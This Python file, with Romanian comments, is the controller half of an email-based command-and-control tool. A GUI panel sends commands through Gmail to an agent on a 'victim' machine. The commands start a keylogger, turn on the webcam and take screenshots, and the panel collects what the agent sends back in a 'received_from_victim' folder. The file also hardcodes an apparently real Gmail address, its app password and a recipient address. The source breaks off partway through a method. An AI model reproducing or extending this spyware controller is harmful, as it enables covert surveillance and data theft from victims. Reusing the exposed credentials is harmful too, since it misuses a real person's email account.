import smtplib
import threading
import time
import customtkinter as ctk
from datetime import datetime
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import imaplib
import email
from email.header import decode_header

# ====================== CONFIGURARE EMAIL ======================
EMAIL_CONFIG = {
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587,
    'imap_server': 'imap.gmail.com',
    'imap_port': 993,
    'sender_email': 'romanbogdan475@gmail.com',
    'sender_password': 'cxzv ddop qosk hvdy',   # App Password
    'recipient_email': 'timoteiroman19@gmail.com'
}

# Setări CustomTkinter
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

def decode_subject(subject):
    """Funcție pentru a decoda corect subiectul emailului, care poate fi codificat."""
    if subject:
        decoded_parts = decode_header(subject)
        subject_parts = []
        for part, encoding in decoded_parts:
            if isinstance(part, bytes):
                try:
                    subject_parts.append(part.decode(encoding or 'utf-8'))
                except (LookupError, UnicodeDecodeError):
                    subject_parts.append(part.decode('utf-8', errors='ignore'))
            else:
                subject_parts.append(part)
        return ''.join(subject_parts)
    return "Fără Subiect"

class EmailC2:
    def __init__(self):
        print("[DEBUG] Inițializare EmailC2...")
        self.save_dir = "received_from_victim"
        os.makedirs(self.save_dir, exist_ok=True)
        print(f"[DEBUG] Director pentru salvare creat/verificat: {self.save_dir}")

    def send_command(self, command):
        """Trimite comandă către agent prin email."""
        print(f"[DEBUG] Încercare trimitere comandă: {command}")
        try:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_CONFIG['sender_email']
            msg['To'] = EMAIL_CONFIG['recipient_email']
            msg['Subject'] = f"COMMAND: {command}"
            msg.attach(MIMEText(f"Command: {command}\nSent at: {datetime.now()}", 'plain'))

            with smtplib.SMTP(EMAIL_CONFIG['smtp_server'], EMAIL_CONFIG['smtp_port']) as server:
                server.starttls()
                server.login(EMAIL_CONFIG['sender_email'], EMAIL_CONFIG['sender_password'])
                server.send_message(msg)

            print(f"[+] Comandă trimisă cu succes: {command}")
            return True
        except smtplib.SMTPAuthenticationError:
            print("[-] EROARE: Autentificare SMTP eșuată. Verifică emailul și parola de aplicație.")
            return False
        except Exception as e:
            print(f"[-] EROARE la trimitere comandă: {e}")
            return False

    def check_received_emails(self):
        """Verifică emailurile primite și returnează informații despre ele."""
        print("[DEBUG] Verificare emailuri primite...")
        emails_info = []
        try:
            with imaplib.IMAP4_SSL(EMAIL_CONFIG['imap_server'], EMAIL_CONFIG['imap_port']) as imap:
                imap.login(EMAIL_CONFIG['sender_email'], EMAIL_CONFIG['sender_password'])
                imap.select('INBOX')
                
                # Căutăm emailuri necitite care NU sunt trimise de noi înșine
                status, messages = imap.search(None, '(UNSEEN UNFROM "romanbogdan475@gmail.com")')
                if status == 'OK' and messages[0]:
                    email_ids = messages[0].split()
                    print(f"[DEBUG] Găsite {len(email_ids)} emailuri necitite de la agent.")
                    for email_id in email_ids:
                        status, msg_data = imap.fetch(email_id, '(RFC822)')
                        if status == 'OK':
                            raw_email = msg_data[0][1]
                            msg = email.message_from_bytes(raw_email)
                            
                            subject = decode_subject(msg['Subject'])
                            sender = msg['From']
                            date = msg['Date']
                            
                            has_attachments = False
                            attachment_info = []
                            
                            if msg.is_multipart():
                                for part in msg.walk():
                                    content_disposition = str(part.get("Content-Disposition"))
                                    if "attachment" in content_disposition:
                                        has_attachments = True
                                        filename = part.get_filename()
                                        if filename:
                                            attachment_info.append(filename)
                            
                            emails_info.append({
                                'subject': subject,
                                'sender': sender,
                                'date': date,
                                'has_attachments': has_attachments,
                                'attachments': attachment_info
                            })
                            
                            # Marchează emailul ca fiind citit
                            imap.store(email_id, '+FLAGS', '\\Seen')
                else:
                    print("[DEBUG] Nu există emailuri noi de la agent.")

        except imaplib.IMAP4.error as e:
            print(f"[-] EROARE IMAP: {e}. Verifică datele de conectare IMAP.")
        except Exception as e:
            print(f"[-] EROARE generală la verificare email: {e}")
            
        return emails_info


class C2GUI(ctk.CTk):
    def __init__(self):
        print("[DEBUG] Începere inițializare interfață grafică...")
        super().__init__()
        
        self.title("C2 Control Panel - Email Based")
        self.geometry("760x720")
        self.protocol("WM_DELETE_WINDOW", self.on_closing) # Gestionare închidere fereastră

        self.c2 = EmailC2()
        self.create_widgets()
        self.check_received_periodically()
        print("[DEBUG] Interfață grafică inițializată complet.")

    def create_widgets(self):
        print("[DEBUG] Creare widget-uri...")
        # Titlu
        ctk.CTkLabel(self, text="C2 Control Panel (Email)", 
                     font=ctk.CTkFont(size=28, weight="bold")).pack(pady=25)

        # Etichetă status
        self.status_label = ctk.CTkLabel(self, text="Ready - Apasă butoanele pentru a trimite comenzi", 
                                         font=ctk.CTkFont(size=15))
        self.status_label.pack(pady=10)

        # Cadru butoane
        btn_frame = ctk.CTkFrame(self)
        btn_frame.pack(pady=25, padx=80, fill="x")

        buttons = [
            ("▶ Start Keylogger", "green", "START_KEYLOGGER"),
            ("■ Stop Keylogger", "red", "STOP_KEYLOGGER"),
            ("📸 Start Webcam", "green", "START_CAMERA"),
            ("📸 Stop Webcam", "red", "STOP_CAMERA"),
            ("📸 Take Screenshot", "blue", "TAKE_SCREENSHOT"),
            ("▶ Start Auto Screenshot", "green", "START_SCREENSHOT"),
            ("■ Stop Auto Screenshot", "red", "STOP_SCREENSHOT"),
            ("🔄 Verifică Emailuri Acum", "purple", None)
        ]

        for text, color, cmd in buttons:
            if cmd:
                btn = ctk.CTkButton(btn_frame, text=text, height=52, fg_color=color,
                                    command=lambda c=cmd: self.send_command_threaded(c))
            else:
                btn = ctk.CTkButton(btn_frame, text=text, height=52, fg_color=color,
                                    command=self.manual_check_threaded)
            btn.pack(pady=8, fill="x")

        # Cadru emailuri primite
        emails_frame = ctk.CTkFrame(self)
        emails_frame.pack(pady=20, padx=80, fill="both", expand=True)

        ctk.CTkLabel(emails_frame, text="Emailuri primite de la agent:", 
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)

        self.emails_textbox = ctk.CTkTextbox(emails_frame, height=260)
        self.emails_textbox.pack(fill="both", expand=True, padx=15, pady=10)
        
        # Afișare inițială
        self.update_emails_display()
        print("[DEBUG] Widget-uri create.")

    def send_command_threaded(self, command):
        """Rulează trimiterea comenzii într-un thread separat pentru a nu bloca GUI."""
        threading.Thread(target=self.send_command, args=(command,), daemon=True).start()

    def send_command(self, command):
        """Gestionează trimiterea comenzii și actualizarea statusului."""
        self.status_label.configure(text=f"📤 Se trimite comanda: {command} ...")
        self.update() # Forțează actualizarea GUI imediat
        success = self.c2.send_command(command)
        if success:
            self.status_label.configure(text=f"✅ Comandă trimisă: {command}")
        else:
            self.status_label.configure(text="❌ Eroare la trimitere comandă (vezi consola)")

    def manual_check_threaded(self):
        """Rulează verificarea manuală într-un thread separat."""
        threading.Thread(target=self.manual_check, daemon=True)